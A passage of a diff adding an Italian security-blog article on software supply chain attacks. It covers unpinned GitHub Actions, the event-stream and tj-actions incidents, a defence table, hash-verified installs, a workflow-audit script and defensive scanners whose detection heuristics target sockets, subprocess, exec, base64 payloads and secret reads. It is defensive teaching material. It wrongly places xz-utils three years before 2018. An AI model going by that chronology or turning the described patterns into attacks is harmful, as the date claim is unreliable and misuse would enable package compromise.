+          <tr><td class="ln">7</td><td class="code">      <span class="cv">token</span>: <span class="cs">${{ secrets.PROD_DEPLOY_TOKEN }}</span></td></tr>
+          <tr><td class="ln">8</td><td class="code"></td></tr>
+          <tr><td class="ln">9</td><td class="code"><span class="cc"># Se l'account di some-vendor viene compromesso o l'azione aggiornata</span></td></tr>
+          <tr><td class="ln">10</td><td class="code"><span class="cc"># con codice malevolo, le credenziali vengono esfiltrate al prossimo push.</span></td></tr>
+          <tr><td class="ln">11</td><td class="code"><span class="cc"># Usa SEMPRE il SHA commit: uses: some-vendor/deploy-action@a1b2c3d4</span></td></tr>
+        </tbody></table>
+      </div>
+    </div>
+
+    <p>
+      Nel marzo 2025, l'attacco <strong>tj-actions/changed-files</strong> ha compromesso
+      migliaia di workflow GitHub. L'attaccante ha ottenuto accesso al token della GitHub Action,
+      ha modificato il codice per stampare i segreti nei log della pipeline, e ha aspettato che
+      i repository la eseguissero. 23.000 repository esposti in poche ore.
+    </p>
+
+    <div class="code-block" data-lang="python">
+      <div class="code-wrap">
+        <table><tbody>
+          <tr><td class="ln">1</td><td class="code"><span class="cc"># audit_workflows.py — verifica se le Actions usano SHA o tag mutabili</span></td></tr>
+          <tr><td class="ln">2</td><td class="code"><span class="ck">import</span> <span class="cv">re</span>, <span class="cv">pathlib</span>, <span class="cv">sys</span></td></tr>
+          <tr><td class="ln">3</span><td class="code"></td></tr>
+          <tr><td class="ln">4</td><td class="code"><span class="cv">SHA_RE</span> <span class="co">=</span> <span class="cv">re</span>.<span class="cf">compile</span>(<span class="cs">r'uses:\s+[\w/\-]+@([0-9a-f]{40})'</span>)</td></tr>
+          <tr><td class="ln">5</td><td class="code"><span class="cv">TAG_RE</span> <span class="co">=</span> <span class="cv">re</span>.<span class="cf">compile</span>(<span class="cs">r'uses:\s+([\w/\-]+)@(v[\d\.]+|main|master|latest)'</span>)</td></tr>
+          <tr><td class="ln">6</td><td class="code"></td></tr>
+          <tr><td class="ln">7</td><td class="code"><span class="ck">def</span> <span class="cf">audit_dir</span>(<span class="cv">base</span>: <span class="ct">str</span>):</td></tr>
+          <tr><td class="ln">8</td><td class="code">    <span class="cv">findings</span> <span class="co">=</span> []</td></tr>
+          <tr><td class="ln">9</td><td class="code">    <span class="ck">for</span> <span class="cv">f</span> <span class="ck">in</span> <span class="cv">pathlib</span>.<span class="ct">Path</span>(<span class="cv">base</span>).<span class="cf">rglob</span>(<span class="cs">"*.yml"</span>):</td></tr>
+          <tr><td class="ln">10</td><td class="code">        <span class="cv">content</span> <span class="co">=</span> <span class="cv">f</span>.<span class="cf">read_text</span>(<span class="cv">errors</span><span class="co">=</span><span class="cs">"ignore"</span>)</td></tr>
+          <tr><td class="ln">11</td><td class="code">        <span class="ck">for</span> <span class="cv">m</span> <span class="ck">in</span> <span class="cv">TAG_RE</span>.<span class="cf">finditer</span>(<span class="cv">content</span>):</td></tr>
+          <tr><td class="ln">12</td><td class="code">            <span class="cv">findings</span>.<span class="cf">append</span>({</td></tr>
+          <tr><td class="ln">13</td><td class="code">                <span class="cs">"file"</span>: <span class="cf">str</span>(<span class="cv">f</span>),</td></tr>
+          <tr><td class="ln">14</td><td class="code">                <span class="cs">"action"</span>: <span class="cv">m</span>.<span class="cf">group</span>(<span class="cn">1</span>),</td></tr>
+          <tr><td class="ln">15</td><td class="code">                <span class="cs">"ref"</span>: <span class="cv">m</span>.<span class="cf">group</span>(<span class="cn">2</span>),</td></tr>
+          <tr><td class="ln">16</td><td class="code">                <span class="cs">"risk"</span>: <span class="cs">"HIGH"</span> <span class="ck">if</span> <span class="cv">m</span>.<span class="cf">group</span>(<span class="cn">2</span>) <span class="ck">in</span> (<span class="cs">"main"</span>, <span class="cs">"master"</span>, <span class="cs">"latest"</span>) <span class="ck">else</span> <span class="cs">"MEDIUM"</span>,</td></tr>
+          <tr><td class="ln">17</td><td class="code">            })</td></tr>
+          <tr><td class="ln">18</td><td class="code">    <span class="ck">return</span> <span class="cv">findings</span></td></tr>
+          <tr><td class="ln">19</td><td class="code"></td></tr>
+          <tr><td class="ln">20</td><td class="code"><span class="ck">if</span> <span class="cv">__name__</span> <span class="co">==</span> <span class="cs">"__main__"</span>:</td></tr>
+          <tr><td class="ln">21</td><td class="code">    <span class="cv">results</span> <span class="co">=</span> <span class="cf">audit_dir</span>(<span class="cv">sys</span>.<span class="cv">argv</span>[<span class="cn">1</span>] <span class="ck">if</span> <span class="cf">len</span>(<span class="cv">sys</span>.<span class="cv">argv</span>) <span class="co">&gt;</span> <span class="cn">1</span> <span class="ck">else</span> <span class="cs">"."</span>)</td></tr>
+          <tr><td class="ln">22</td><td class="code">    <span class="ck">for</span> <span class="cv">r</span> <span class="ck">in</span> <span class="cv">results</span>:</td></tr>
+          <tr><td class="ln">23</td><td class="code">        <span class="cf">print</span>(<span class="cs">f"[<span class="cv">{r['risk']}</span>] <span class="cv">{r['action']}</span>@<span class="cv">{r['ref']}</span> in <span class="cv">{r['file']}</span>"</span>)</td></tr>
+        </tbody></table>
+      </div>
+    </div>
+
+    <div class="terminal-output">
+      <span class="t-prompt">$ </span><span class="t-cmd">python audit_workflows.py .github/workflows/</span><br>
+      <span class="t-out">Scanning 12 workflow files...</span>
+      <span class="t-warn">[HIGH] some-vendor/deploy-action@main in .github/workflows/deploy.yml</span>
+      <span class="t-warn">[HIGH] tj-actions/changed-files@master in .github/workflows/pr-check.yml</span>
+      <span class="t-out">[MEDIUM] actions/checkout@v4 in .github/workflows/test.yml</span>
+      <span class="t-ok">[OK] actions/setup-python@a1b2c3d4e5f6... in .github/workflows/lint.yml</span>
+      <span class="t-out"></span>
+      <span class="t-highlight">2 HIGH risk, 1 MEDIUM risk trovati. Fix: pin a SHA commit specifico.</span>
+    </div>
+
+    <div class="insight-box">
+      <p><strong>Non serve pubblicare un pacchetto nuovo.</strong> Basta prendere il controllo di uno
+      esistente. Nel 2018, un utente ha convinto il maintainer di <code>event-stream</code> (npm,
+      2 milioni di download settimanali) a cedergli l'accesso al repository. Ha aggiunto una
+      dipendenza malevola, <code>flatmap-stream</code>, che rubava wallet Bitcoin. Nessun typo,
+      nessuna confusione di nome: il pacchetto era quello giusto, aggiornato dal maintainer
+      ufficiale. Lo stesso pattern di xz-utils, tre anni prima, su scala diversa. Il vettore
+      più pericoloso non è il registro. È la fiducia nel maintainer.</p>
+    </div>
+
+    <!-- ============================================================
+         SEZIONE 6 — DIFESE
+         ============================================================ -->
+    <h2><span class="section-number">06 — mitigazioni</span>Come si difende la catena</h2>
+
+    <p>
+      Non esiste una difesa single-shot. La supply chain richiede difesa a strati.
+    </p>
+
+    <table class="strategy-table">
+      <thead>
+        <tr>
+          <th>Vettore</th>
+          <th>Difesa Primaria</th>
+          <th>Tool / Standard</th>
+          <th>Effort</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Typosquatting PyPI/npm</td>
+          <td>Verificare nome prima di installare. Hash lockfile.</td>
+          <td><code>pip-audit</code>, <code>npm audit</code>, <code>pip install --require-hashes</code></td>
+          <td>Basso</td>
+        </tr>
+        <tr>
+          <td>Dependency Confusion</td>
+          <td>Prefissi privati registrati anche pubblicamente. Namespace scoping.</td>
+          <td>Artifactory "priority-resolution", npm scoped packages (<code>@company/pkg</code>)</td>
+          <td>Medio</td>
+        </tr>
+        <tr>
+          <td>Codice malevolo in pacchetti legittimi</td>
+          <td>SBOM + analisi statica pre-installazione</td>
+          <td>Sigstore/Cosign, SLSA Level 3, <code>socket.dev</code></td>
+          <td>Alto</td>
+        </tr>
+        <tr>
+          <td>GitHub Actions non pinnate</td>
+          <td>Pin a SHA commit immutabile</td>
+          <td><code>pin-github-action</code>, <code>zizmor</code>, GitHub required reviewers</td>
+          <td>Basso</td>
+        </tr>
+        <tr>
+          <td>Maintainer compromise (xz-style)</td>
+          <td>Reproducible builds. Verifica firma multipla.</td>
+          <td>Sigstore, SLSA, Nix reproducible builds</td>
+          <td>Molto alto</td>
+        </tr>
+        <tr>
+          <td>Payload eseguito durante install</td>
+          <td>Install-time isolation: build in sandbox senza rete</td>
+          <td>Container effimeri, <code>--no-build-isolation</code>, Nix sandboxed builds, Bazel hermetic</td>
+          <td>Medio</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="code-block" data-lang="bash">
+      <div class="code-wrap">
+        <table><tbody>
+          <tr><td class="ln">1</td><td class="code"><span class="cc"># Installa con hash verification — lockfile con hash SHA256</span></td></tr>
+          <tr><td class="ln">2</td><td class="code"><span class="cv">pip</span> install <span class="co">--require-hashes</span> <span class="co">-r</span> requirements.txt</td></tr>
+          <tr><td class="ln">3</td><td class="code"></td></tr>
+          <tr><td class="ln">4</td><td class="code"><span class="cc"># Generare requirements con hash (pip-tools)</span></td></tr>
+          <tr><td class="ln">5</td><td class="code"><span class="cv">pip-compile</span> <span class="co">--generate-hashes</span> requirements.in</td></tr>
+          <tr><td class="ln">6</td><td class="code"></td></tr>
+          <tr><td class="ln">7</td><td class="code"><span class="cc"># Audit continuo con pip-audit (integrato in CI)</span></td></tr>
+          <tr><td class="ln">8</td><td class="code"><span class="cv">pip-audit</span> <span class="co">--requirement</span> requirements.txt <span class="co">--output</span> json</td></tr>
+          <tr><td class="ln">9</td><td class="code"></td></tr>
+          <tr><td class="ln">10</td><td class="code"><span class="cc"># Per npm: verificare integrità con lockfile v3</span></td></tr>
+          <tr><td class="ln">11</td><td class="code"><span class="cv">npm</span> ci  <span class="cc"># usa package-lock.json, fallisce se diverge</span></td></tr>
+        </tbody></table>
+      </div>
+    </div>
+
+    <!-- ============================================================
+         SEZIONE 7 — LAB
+         ============================================================ -->
+    <h2><span class="section-number">07 — lab</span>Gli script per il laboratorio</h2>
+
+    <p>
+      Il lab completo include sette strumenti per analizzare, monitorare e difendere la propria supply chain.
+    </p>
+
+    <div class="pipeline-steps">
+      <div class="pipeline-step">
+        <div class="step-num">01</div>
+        <div class="step-name">typo_scanner.py</div>
+        <div class="step-detail">Genera varianti typosquatting e verifica disponibilità su PyPI/npm</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">02</div>
+        <div class="step-name">confusion_audit.py</div>
+        <div class="step-detail">Analizza requirements.txt cercando pacchetti interni non registrati pubblicamente</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">03</div>
+        <div class="step-name">setup_analyzer.py</div>
+        <div class="step-detail">Analisi statica di setup.py e __init__.py: socket, subprocess, os.system</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">04</div>
+        <div class="step-name">audit_workflows.py</div>
+        <div class="step-detail">Scansiona workflow GitHub Actions cercando ref mutabili (@main, @latest)</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">05</div>
+        <div class="step-name">sbom_diff.py</div>
+        <div class="step-detail">Confronta SBOM tra due build e rileva dipendenze aggiunte o modificate</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">06</div>
+        <div class="step-name">pypi_sentinel.py</div>
+        <div class="step-detail">Monitor real-time del feed RSS PyPI: analisi euristica + AI (Ollama) su ogni nuovo pacchetto</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">07</div>
+        <div class="step-name">installed_audit.py</div>
+        <div class="step-detail">Scansiona i pacchetti pip installati, scarica gli sdist e cerca pattern malevoli</div>
+      </div>
+    </div>
+
+    <div class="insight-box fade-in">
+      <p><strong>Gli script del lab.</strong>
+         <code>typo_scanner.py</code>: genera varianti Levenshtein-1 di ogni dipendenza e controlla PyPI/npm API.
+         <code>confusion_audit.py</code>: identifica nomi di pacchetti con prefissi aziendali non presenti nei registri pubblici.
+         <code>setup_analyzer.py</code>: analisi statica AST di setup.py per rilevare pattern sospetti (network, subprocess, exec).
+         <code>audit_workflows.py</code>: verifica che tutte le Actions usino SHA commit immutabili.
+         <code>sbom_diff.py</code>: genera e confronta CycloneDX SBOM tra ambienti diversi.
+         <code>pypi_sentinel.py</code>: monitor real-time del feed RSS PyPI. Polling, download sdist, 20 regole euristiche, analisi AST,
+         check typosquatting Levenshtein, e analisi AI opzionale via Ollama. Include campioni sintetici per il test.
+         <code>installed_audit.py</code>: scansiona l'ambiente pip attivo, scarica ogni sdist da PyPI e lo analizza con lo stesso engine del sentinel.
+         Tutto nella cartella <a href="https://github.com/Pinperepette/signal.pirate/tree/main/scripts/il-pacco-e-avvelenato" style="color: var(--accent-attention);">scripts/il-pacco-e-avvelenato</a> su GitHub.
+      </p>
+    </div>
+
+    <h3 style="margin-top: 2.5rem;">pypi_sentinel.py: analisi campioni sintetici</h3>
+    <p>Cinque campioni malevoli (exfiltration, exec+base64, reverse shell, steganografia, typosquat wrapper) e uno pulito.
+    Il sentinel li classifica correttamente: 3 CRITICAL, 2 HIGH, 1 CLEAN.</p>
+    <img src="../immagini/supply-chain/pypi_sentinel.png" alt="pypi_sentinel.py: 6 campioni analizzati, 3 CRITICAL, 2 HIGH, 1 CLEAN" class="lab-screenshot fade-in">
+
+    <h3 style="margin-top: 2.5rem;">typo_scanner.py: varianti di "requests"</h3>
+    <p>87 varianti generate (trasposizione, omissione, inserzione, homoglyph). Tre esistono su PyPI:
+    <code>requestx</code>, <code>requestz</code>, <code>requezts</code>.</p>
+    <img src="../immagini/supply-chain/typo_scanner.png" alt="typo_scanner.py: 87 varianti di requests, 3 esistono su PyPI" class="lab-screenshot fade-in">
+
+    <h3 style="margin-top: 2.5rem;">setup_analyzer.py: analisi statica AST</h3>
+    <p>Scansione dei campioni sintetici. 7 file analizzati, 23 finding: import di socket/subprocess, exec(), base64.b64decode(),
+    URL hardcoded verso C2, codecs.decode hex.</p>
+    <img src="../immagini/supply-chain/setup_analyzer.png" alt="setup_analyzer.py: 7 file analizzati, 23 finding sospetti" class="lab-screenshot fade-in">
+
+    <h3 style="margin-top: 2.5rem;">confusion_audit.py: dependency confusion</h3>
+    <p>Audit di un requirements.txt con prefissi aziendali. Tre pacchetti interni non registrati su PyPI:
+    un attaccante potrebbe registrarli con versione alta e ottenere esecuzione di codice.</p>
+    <img src="../immagini/supply-chain/confusion_audit.png" alt="confusion_audit.py: 3 pacchetti interni non su PyPI, vulnerabili a dependency confusion" class="lab-screenshot fade-in">
+
+    <h3 style="margin-top: 2.5rem;">sbom_diff.py: inventario dipendenze</h3>
+    <p>Genera una SBOM in formato CycloneDX dall'ambiente pip attivo. 1108 componenti catalogati con nome, versione e PURL.</p>
+    <img src="../immagini/supply-chain/sbom_diff.png" alt="sbom_diff.py: SBOM generata con 1108 componenti" class="lab-screenshot fade-in">
+
+    <h3 style="margin-top: 2.5rem;">pypi_sentinel.py --check: pacchetto singolo</h3>
+    <p>Verifica rapida su un pacchetto specifico. <code>colorama</code> risulta CLEAN: score 0, nessun pattern sospetto.</p>
+    <img src="../immagini/supply-chain/check.png" alt="pypi_sentinel.py: check colorama, CLEAN, score 0/100" class="lab-screenshot fade-in">
+
+    <h3 style="margin-top: 2.5rem;">installed_audit.py: audit pacchetti installati</h3>
+    <p>Scansione dei primi 25 pacchetti pip installati. 15 CLEAN, 5 MEDIUM, 2 HIGH, 2 CRITICAL.
+    Entrambi i CRITICAL sono falsi positivi. Li ho verificati scaricando gli sdist e leggendo il codice sorgente.</p>
+
+    <p><code>altgraph==0.17.4</code> (score 100). Pacchetto di Ronald Oussoren, ecosistema PyObjC/PyInstaller.
+    La chiamata <code>eval()</code> a riga 68 valuta environment markers PEP 508 in un namespace ristretto
+    che contiene solo <code>python_version</code>, <code>os</code>, <code>sys</code>: nessun accesso al
+    filesystem o alla rete. In pratica non viene nemmeno eseguita perché il pacchetto non ha dipendenze
+    condizionali. <code>__import__()</code> a riga 290 importa i moduli di test dal proprio pacchetto,
+    eseguito solo con <code>python setup.py test</code>. <code>cmdclass</code> aggiunge URL di progetto
+    in PKG-INFO. Gli URL puntano a readthedocs, GitHub e PyPI.</p>
+
+    <p><code>aiohttp==3.10.5</code> (score 60). La tripla segnalazione su <code>os.environ</code> corrisponde
+    a una singola riga: <code>NO_EXTENSIONS = bool(os.environ.get("AIOHTTP_NO_EXTENSIONS"))</code>. È il
+    toggle standard per disabilitare la compilazione delle estensioni C. Lo stesso pattern lo usano
+    <code>ujson</code>, <code>msgpack</code>, <code>pyyaml</code>. Il riferimento a <code>http.client</code>
+    nel setup.cfg non è un import: è la descrizione del progetto ("Async http client/server framework").</p>
+
+    <p>Questo è il punto: un'analisi euristica non distingue <code>os.environ.get("AIOHTTP_NO_EXTENSIONS")</code>
+    da <code>os.environ.get("AWS_SECRET_ACCESS_KEY")</code>. Stessa API, intent opposto.
+    Lo strumento segnala. La valutazione resta umana.</p>
+    <img src="../immagini/supply-chain/installed_audit.png" alt="installed_audit.py: 25 pacchetti scansionati, 2 CRITICAL (falsi positivi verificati su altgraph e aiohttp)" class="lab-screenshot fade-in">
+
+    <h3 style="margin-top: 2.5rem;">pypi_sentinel.py --live: monitor real-time</h3>
+    <p>Polling del feed RSS di PyPI ogni 30 secondi. Su 40 pacchetti nuovi, il sentinel ha trovato
+    due alert.</p>
+
+    <p><code>thisisimytest</code> (CRITICAL, score 60). Tre chiamate <code>os.system()</code> nel setup.py.
+    Nome sospetto, versione unica. Ho provato a verificarlo su PyPI dopo la scansione: il pacchetto
+    non esiste più. È stato rimosso, probabilmente dai sistemi automatici di PyPI o dall'autore stesso.
+    Un pacchetto che viene pubblicato e cancellato nel giro di ore è esattamente il pattern dei
+    supply chain attack reali: finestra breve, impatto su chi ha fatto <code>pip install</code>
+    nel momento sbagliato. Il sentinel lo ha catturato quando era ancora attivo.</p>
+
+    <p><code>csp-adapter-telegram</code> (MEDIUM, score 20). Segnalato per <code>__import__()</code>
+    a riga 1. Falso positivo: è un pattern comune per lazy import in pacchetti con dipendenze opzionali.
+    Il pacchetto esiste, è stabile, ha una storia di release coerente.</p>
+    <img src="../immagini/supply-chain/live.png" alt="pypi_sentinel.py live: 40 pacchetti analizzati, thisisimytest CRITICAL (rimosso da PyPI), csp-adapter-telegram MEDIUM (falso positivo)" class="lab-screenshot fade-in">
+
+    <div class="warning-box fade-in">
+      <p><strong>Il problema strutturale.</strong> PyPI e npm pubblicano pacchetti in secondi, senza revisione umana.
+      La rimozione richiede ore o giorni. Tempo sufficiente per raggiungere migliaia di installazioni automatizzate.
+      Nel 2024, oltre il 40% dei pacchetti malevoli rilevati era rimasto attivo per più di 24 ore prima della rimozione.
+      I sistemi CI/CD eseguono <code>pip install</code> centinaia di volte al giorno, su ogni PR.
+      La supply chain non è un problema teorico: è la superficie di attacco più trascurata in produzione.</p>
+    </div>
+
+    <!-- ============================================================
+         CONCLUSIONE
+         ============================================================ -->
+    <div class="conclusion-box fade-in">
+      <div class="quote">"Non hai bisogno di bucare il server.<br>Aspetti che il server installi il tuo codice."</div>
+      <p style="color: var(--text-secondary); margin: 1rem 0 0;">
+        Il supply chain attack non sfrutta una vulnerabilità nel codice: sfrutta la fiducia.
+        La fiducia che riponiamo nei registri pubblici, nei maintainer, nei contributor, nelle
+        azioni di terze parti. Jia Tan ha dimostrato che questa fiducia può essere ingegnerizzata
+        su un orizzonte di anni. La risposta non è smettere di usare dipendenze. È cambiare come
+        le usiamo: lockfile con hash, SBOM, SLSA, verifiche di firma, Actions pinnate a SHA.
+        Ogni dipendenza senza hash è una promessa che qualcun altro potrebbe non mantenere.
+      </p>
+      <p style="color: var(--text-secondary); margin: 0.5rem 0 0; font-family: var(--font-mono); font-size: 0.8rem;">
+        Signal Pirate
+      </p>
+    </div>
+
+  </article>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>Signal Pirate | <a href="https://github.com/pinperepette" target="_blank" rel="noopener">Andrea Amani</a> aka The Pirate</p>
+    <p style="margin-top: 0.5rem; opacity: 0.5;">Reverse engineering dell'attenzione digitale</p>
+  </footer>
+
+  <!-- Scripts -->
+  <script src="../js/main.js"></script>
+
+</body>
+</html>
